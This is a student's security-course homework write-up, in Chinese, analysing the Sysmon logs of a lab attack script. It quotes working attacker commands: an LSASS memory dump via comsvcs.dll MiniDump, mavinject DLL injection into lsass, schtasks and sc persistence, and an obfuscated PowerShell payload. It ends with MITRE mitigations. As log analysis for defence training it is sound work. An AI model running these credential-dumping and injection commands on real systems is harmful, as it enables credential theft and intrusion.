---
title: TaiwanHolyHigh - SoC基礎維運 - HW2
tags: [TaiwanHolyHigh]

category: "Security Course｜Tai.HolyHigh｜SoC基礎維運"
date: 2024-01-31
---

# TaiwanHolyHigh - SoC基礎維運 - HW2
<!-- more -->

## Background
* [Sysmon Event ID](https://learn.microsoft.com/zh-tw/sysinternals/downloads/sysmon)
    > ### 事件識別碼 1：處理程序建立
    > 處理程序建立事件會提供新建立處理程序的延伸資訊。 完整的命令列提供處理程序執行的內容。 `ProcessGUID` 欄位是跨定義域此處理程式的唯一值，可讓事件相互關聯更容易。 雜湊是檔案的完整雜湊，具有 `HashType` 欄位中的演算法。
    > 
    > ---
    > ### 事件識別碼 8：CreateRemoteThread
    > `CreateRemoteThread` 事件會偵測處理程序何時在另一個處理程序中建立執行緒。 惡意程式碼會使用這項技術來插入程式碼，並隱藏在其他處理程序中。 事件表示來源和目標處理程序。 其會提供將在新執行緒中執行之程式碼的資訊：StartAddress、`StartModule` 和 `StartFunction`。 請注意，系統會推斷 `StartModule` 和 `StartFunction` 欄位，如果起始位址位於載入的模組或已知的匯出函式之外，這些欄位可能會是空的。
    > 
    > ---
    > ### 事件識別碼 11：FileCreate
    > 建立或覆寫檔案時，系統會記錄檔案建立作業。 此事件適用於監視自動啟動位置，例如開機資料夾，以及暫存和下載目錄，這是初始感染期間惡意程式碼放置的常見位置。
    > 
    > ---
    > ### 事件識別碼 13：RegistryEvent (值已設定)
    > 此登錄事件類型會識別登錄值修改。 事件會記錄針對類型為 `DWORD` 和 `QWORD` 的登錄值所寫入的值。

## Recon - Event Log呈現的攻擊順序
1. Event ID: 8 → CreateRemoteThread
    首先看到23/12/17 15:1024的時候，由==NT AUTHORITY\SYSTEM==發起的新的thread，從原本的Process(ID: 820)幫另外一個Process(ID: 7464)建立，誠如MSDN上的說明這應該是惡意程式為了不要被砍掉
    ![圖片](https://hackmd.io/_uploads/rJjOTA-wa.png)
    比較經典的案例是類似NTU CS助教 - @Ice1187 在Window Malware講到的[reflective dll injection](https://attack.mitre.org/techniques/T1055/001/)，也就是Mitre紀載的==T1055.001==，其本質上就是利用CreateRemoteThread在一個正常的process開一個thread，然後做一些惡意的事情，這樣的話defender也不會把它砍掉，因為從外部看，就只是一個正常的process
    ![圖片](https://hackmd.io/_uploads/Hy9wgyfPp.png)
2. Kernel開Thread
    接著為了成功開一個thread，就需要kernel base的dll做一些事情，包含:
    ```
    C:\Windows\SysWOW64\DllHost.exe" /Processid:{776DBC8D-7347-478C-8D71-791E12EF49D8}
    consent.exe 6504 376 000001EC1C876D30
    ```
3. 啟動惡意script
    從以下資訊可以知道該惡意script(auto-attack.bat)是由cmd執行起來的，另外執行這一串command的是explorer.exe代表他可能是執行在檔案總管執行或是在桌面執行
    ```
    ParentProcessId 3176 
    ParentImage C:\Windows\explorer.exe 
    ParentCommandLine C:\Windows\Explorer.EXE 
    ParentUser W10C\Admin 
    CommandLine "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat"  
    ProcessId 7544 
    ```
4. 選擇YN
    從以下資訊可以知道choice.exe是由auto-attack.bat執行起來的，看了[MSDN](https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/choice)的說明，知道其會有一個時間限制以及要選擇的提示
    ```
    ParentProcessId 7544 
    ParentImage C:\Windows\System32\cmd.exe 
    ParentCommandLine "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat"  
    ParentUser W10C\Admin 
    OriginalFileName choice.exe 
    CommandLine choice /c YN
    ```
5. PowerShell - Get lsass.dmp
    這條command就好玩了，接著auto-attack.bat又接續執行powershell，並且執行command如下，這一條command一開始看不太懂，隨便搜尋發現是一個經典的payload，主要是參考@3gstudent的文章[《MiniDumpWriteDump via COM+ Services DLL》的利用測試](https://3gstudent.github.io/MiniDumpWriteDump-via-COM+-Services-DLL-%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95)，一般來說我們都會想辦法用procdump之類的工具把lsass或是SYSTEM dump出來，但其實也可以用其他internal dll呼叫MiniDump的方式，把東西拿到手，範例的話可以參考[comsvcs MiniDump examples](https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e)
    > "C:\Windows\System32\rundll32.exe"  C:\Windows\System32\comsvcs.dll MiniDump \<PID> \Windows\Temp\<filename>.dmp full
    
    其實就和這一條payload有87趴像，中間的 ==((Get-Process lsass).Id)== 就是在抓lsass的PID，另外@3gstudent也有提到這個必須要是管理員權限才可以執行
    ```
    ParentProcessId 7544 
    ParentImage C:\Windows\System32\cmd.exe 
    ParentCommandLine "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat"  
    ParentUser W10C\Admin 
    OriginalFileName PowerShell.EXE 
    CommandLine powershell.exe -NoProfile -Command "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full"
    ProcessId 8832
    ```
    
    接著就是真的實際執行該條command後拿到lsass.dmp
    ```
    ParentProcessId 8832 
    ParentImage C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
    ParentCommandLine powershell.exe -NoProfile -Command "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full" 
    ParentUser W10C\Admin 
    OriginalFileName RUNDLL32.EXE 
    CommandLine "C:\Windows\system32\rundll32.exe" C:\Windows\System32\comsvcs.dll MiniDump 892 C:\Windows\Temp\lsass.dmp full 
    ```
6. Event ID: 11 - FileCreate
    ```
    TargetFilename C:\Windows\Temp\lsass.dmp 
    CreationUtcTime 2023-12-17 07:10:29.916 
    User W10C\Admin 
    ```
7. Timeout
    從以下紀錄得知auto-attack.bat又繼續搞事，看了[MSDN](https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/timeout)的說明，有點類似sleep的功能，雖然不知道加這行要幹嘛?
    ```
    ParentProcessId 7544 
    ParentImage C:\Windows\System32\cmd.exe 
    ParentCommandLine "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat"  
    ParentUser W10C\Admin
    ProcessId 6080 
    OriginalFileName timeout.exe 
    CommandLine TIMEOUT /T 3 
    ```
8. FileCreate - notepad.exe
    這個我猜是直接embedded在auto-attack.bat裡面的一段notepad的bytecode，以防受害電腦沒有notepad.exe就可以直接創一個(?)不是很確定
    ```
    Image C:\Windows\System32\cmd.exe 
    TargetFilename C:\Windows\Temp\notepad.exe
    CreationUtcTime 2023-12-17 07:10:32.119 
    User W10C\Admin 
    ```
9. Real Attack Payload
    原本的payload很明顯就是base64的encode，不過實際解過發現參雜很多trash byte，如果把這些東西都拿掉就會很明朗，這也是一個常見的技巧，就是為了不要讓defender或是其他防毒知道payload pattern被已知database match出來，所以做了一些scramble，視情況有時候這種scramble的題目真的很討厭，不管是[BalsnCTF 2023 - Kill-4](https://hackmd.io/@SBK6401/BJphpuJM6#Kill-4)或[PicoCTF - Some Assembly Required 3](https://hackmd.io/@SBK6401/SyYU8hx62)都沒有解出來
    ```python
    >>> from base64 import *
    >>> payload = "JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA=="
    >>> decode = b64decode(payload.encode())
    >>> decode.replace(b'\x00', b'').decode()
    '& (gcm (\'ie{0}\' -f \'x\')) ("Wr"+"it"+"e-H"+"ost \'H"+"el"+"lo, fr"+"om P"+"ow"+"erS"+"h"+"ell!\'")'
    ```
    所以這一個正確的payload應該是 ==& (gcm ('ie{0}' -f 'x')) ("Write-Host 'Hello, from PowerShell!'")==
    
    其實後來仔細找找就會發現[redcanary的文章](https://redcanary.com/threat-detection-report/techniques/powershell/)中就有提到這一個obfuscated，就如同上面寫的，他就是`Invoke-Expression "Write-Host 'Hello, from PowerShell!'"`，如果實際丟到powershell的話就會在console印出`Hello, from PowerShell!`的字樣

10. Schtasks.exe
    這個也是惡意軟體常見的操作，為了要避免重開機或是斷網等駭客不想看到的風險，會利用registry或是排程工具做到定期實質的操作，由下面的紀錄可以知道有是auto-attack.bat發起的process
    ```
    ParentProcessId 7544 
    ParentImage C:\Windows\System32\cmd.exe 
    ParentCommandLine "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat"  
    ParentUser W10C\Admin 
    OriginalFileName schtasks.exe 
    CommandLine schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > C:\Windows\Temp\current_date.txt" 
    ```
    詳細的排程指令見[MSDN](https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/schtasks)或是直接看[chatgpt的說明](https://chat.openai.com/share/17e2882e-e4f3-4e16-9bb2-80e3130bc3e3)
    接著就會看到在Windows存放Tasks的地方真的有一個叫做CMDTestTask被Create出來:
    ```
    ProcessId 1572 
    Image C:\Windows\system32\svchost.exe 
    TargetFilename C:\Windows\System32\Tasks\CMDTestTask 
    CreationUtcTime 2023-12-17 07:10:35.212 
    User NT AUTHORITY\SYSTEM 
    ```
11. Timeout → Query Task → Delete Task
    從以下操作可以知道攻擊者應該只是想要知道這個功能有沒有辦法操作在victim中
    ```
    ParentProcessId 7544 
    ParentImage C:\Windows\System32\cmd.exe 
    ParentCommandLine "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat"  
    ParentUser W10C\Admin 
    OriginalFileName schtasks.exe 
    CommandLine schtasks /Query /TN CMDTestTask 
    ↓
    ParentProcessId 7544 
    ParentImage C:\Windows\System32\cmd.exe 
    ParentCommandLine "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat"  
    ParentUser W10C\Admin 
    OriginalFileName schtasks.exe 
    CommandLine schtasks /Delete /TN CMDTestTask /F 
    ```
12. Mavinject
    這個攻擊手法也是很有趣，詳細可以看[Mitre的記錄-T1218-013](https://attack.mitre.org/techniques/T1218/013/)
    > 攻擊者可能會濫用mavinject.exe 來代理惡意程式碼的執行。Mavinject.exe 是Microsoft 應用程式虛擬化注入器，它是一種Windows 實用程序，可以作為Microsoft 應用程式虛擬化(App-V) 的一部分將程式碼注入到外部進程中。
    > 攻擊者可能會濫用 mavinject.exe 將惡意 DLL 注入正在運行的進程（即動態連結程式庫注入），從而允許執行任意程式碼（例如 `C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL`）。 由於 mavinject.exe 可能經過 Microsoft 數位簽名，因此透過此方法代理執行可能會逃避安全性產品的偵測，因為執行被隱藏在合法進程下。
    > 除了動態連結程式庫注入之外，Mavinject.exe 還可以被濫用透過其 /HMODULE 命令列參數（例如 `mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER`）執行導入描述符注入。 此指令會將由指定 DLL 組成的導入表條目注入到模組的給定基底位址處。

    ```
    ParentProcessId 7544 
    ParentImage C:\Windows\System32\cmd.exe 
    ParentCommandLine "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat"  
    ParentUser W10C\Admin 
    OriginalFileName PowerShell.EXE 
    CommandLine powershell.exe -NoProfile -Command "mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\Windows\System32\vbscript.dll" 
    ProcessId 11488
    ```
    從以上payload發現和Mitre上的記錄一模一樣，把lsass的process inject到vbscript.dll這種windows高度信任的檔案
    ```
    ParentProcessId 11488 
    ParentImage C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
    ParentCommandLine powershell.exe -NoProfile -Command "mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\Windows\System32\vbscript.dll" 
    ParentUser W10C\Admin 
    OriginalFileName mavinject64.exe 
    CommandLine "C:\Windows\system32\mavinject.exe" 892 /INJECTRUNNING C:\Windows\System32\vbscript.dll 
    ```
    所以下一個log就實際執行上一個command
13. Timeout → Powershell Hello Payload → Timeout → CMD Hello Payload → Timeout
    接著auto-attack.bat又執行powershell的下列command:
    ```
    ParentProcessId 7544 
    ParentImage C:\Windows\System32\cmd.exe 
    ParentCommandLine "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat"  
    ParentUser W10C\Admin 
    OriginalFileName PowerShell.EXE 
    CommandLine powershell.exe -NoProfile -Command "(ps lsass).Modules | Where-Object { $_.ModuleName -eq 'vbscript.dll' }" 
    ```
    接著重複執行第9步的powershell payload:
    ```
    ParentProcessId: 7544
    ParentImage: C:\Windows\System32\cmd.exe
    ParentCommandLine: "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat" 
    ParentUser: W10C\Admin
    OriginalFileName: PowerShell.EXE
    CommandLine: powershell.exe  -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
    ProcessId: 13276
    ```
    再執行一次CMD版本的Hello Payload:
    ```
    ParentProcessId: 7544
    ParentImage: C:\Windows\System32\cmd.exe
    ParentCommandLine: "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat" 
    ParentUser: W10C\Admin
    OriginalFileName: Cmd.Exe
    CommandLine: cmd  /c echo Hello, from CMD!  
    ```
14. Open Notepad.exe → Timeout 
    這一段payload就只是在啟動Notepad.exe這個application而已
    ```
    ParentProcessId: 7544
    ParentImage: C:\Windows\System32\cmd.exe
    ParentCommandLine: "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat" 
    ParentUser: W10C\Admin
    OriginalFileName: RUNDLL32.EXE
    CommandLine: rundll32.exe  pcwutl.dll,LaunchApplication C:\Windows\System32\notepad.exe
    ```
15. Open Service Control Manager → Timeout → Query Registry → Delete Registry
    根據[MSDN](https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/sc-create)的說明，==sc.exe==是一個在資料庫中建立服務的子機碼和專案的工具，而記錄如下:
    ```
    ParentProcessId: 7544
    ParentImage: C:\Windows\System32\cmd.exe
    ParentCommandLine: "C:\Windows\System32\cmd.exe" /C "C:\Users\Admin\Desktop\auto-attack.bat" 
    ParentUser: W10C\Admin
    OriginalFileName: sc.exe
    CommandLine: sc  create CMDTestService type=own binPath="cmd /c date /T > C:\Windows\Temp\current_date.txt"
    ```
    總的來說，目的是創建一個名為 "CMDTestService" 的服務，該服務指定在其本身process中執行的服務，且不會與其他服務共用可執行檔，並且它的主要功能是運行一個命令，將當前日期寫入到指定的文本文件中，也的確在Event ID: 13中看到創了一個registry event在==HKLM\System\CurrentControlSet\Services\CMDTestService\Start==
    不過接著就像上面看到排程的操作一樣，他進行了該Event的query，當query到的時候就是確定惡意程式可以透過registry進行操作，並且直接把該event刪除，詳細紀錄如下:
    ```
    OriginalFileName: sc.exe
    CommandLine: sc  query CMDTestService
    ↓
    OriginalFileName: sc.exe
    CommandLine: sc  delete CMDTestService
    ```

## Conclusion
總結以上的操作，會發現auto-attack.bat在做的事情只有幾件事:
1. (攻擊1)利用comsvcs.dll搭配MiniDump把lsass拿到手
2. (攻擊2)利用notepad.exe執行base64並且obfuscate過後的payload，如果把該payload改成更進階或更惡意的手法，就會造成更大的損失
3. (攻擊3)利用Schtasks.exe這樣內建的排程工具，可以做到定期執行惡意的動作(Persistent)，諸如定期回報給C2 server以便更好掌握手中的肉機，後續嘗試DDoS攻擊可以用到，詳細可以看[Mitre T1053](https://attack.mitre.org/techniques/T1053/)有更多的手法可以參考
4. (攻擊4)利用mavinject.exe把lsass process注入到正常執行且可信度高的process，如果我們是注入惡意的process，是不是就可以達到更大的受害範圍?詳細可以參考[Mitre T1218-013](https://attack.mitre.org/techniques/T1218/013/)
5. (攻擊5)有點像攻擊2的另一個版本，其實是利用更強大的powershell進行一樣的攻擊，payload的靈活度也大大提升
6. (攻擊6)利用sc.exe設定registry，可以先看看[Mitre T1569-002](https://attack.mitre.org/techniques/T1569/002/)的說明，攻擊者可以利用這類型的手法和工具，諸如PsExec, sc.exe等，達到遠端執行command的功能

## 建議處理措施
* 根據Mitre針對T1055(Reflective DLL Injection)的mitigations就是針對該行為的patter進行endpoint的偵測(prevention)
* 至於針對T1218-013(Mavinject)的mitigations有兩種，
    * 其一是把該功能disable或remove；
    * 其二是做好execution prevention，避免被濫用
* 針對T1053(Schtasks.exe)的mitigation，有四種，
    * 其一是稽核，PowerSploit 框架等工具包包含 PowerUp 模組，可用於探索系統排程任務中的權限弱點，可用於提升權限；
    * 其二是做好OS Configuration的身分認證操作，配置計劃任務的設定以強制任務在經過身份驗證的帳戶的上下文中運行，而不是允許它們作為SYSTEM運行。關聯的登錄項目位於 HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl。可透過 GPO 設定此設定：電腦設定 > [策略] > Windows 設定 > 安全性設定 > 本機原則 > 安全性選項： 網域控制站：允許伺服器操作員排程任務，設定為停用；
    * 其三，新增配置「增加排程優先權」選項以僅允許管理員群組調度優先權進程的權限。 這可以透過 GPO 進行設定：電腦設定 > [策略] > Windows 設定 > 安全性設定 > 本機原則 > 使用者權限指派：增加計畫優先權；
    * 其四，限制使用者帳戶的權限並修復權限升級向量，以便只有授權管理員才能在遠端系統上建立排程任務。
* 針對T1569(sc.exe)的mitigation有三種
    * 在endpoint偵測他的behavior以便做到prevention
    * 確保帳號的權限不允許具有較低權限等級的使用者建立以較高權限等級執行的服務或與之互動
    * 確保具有較低權限等級的使用者無法取代或修改高權限等級的服務二進位。
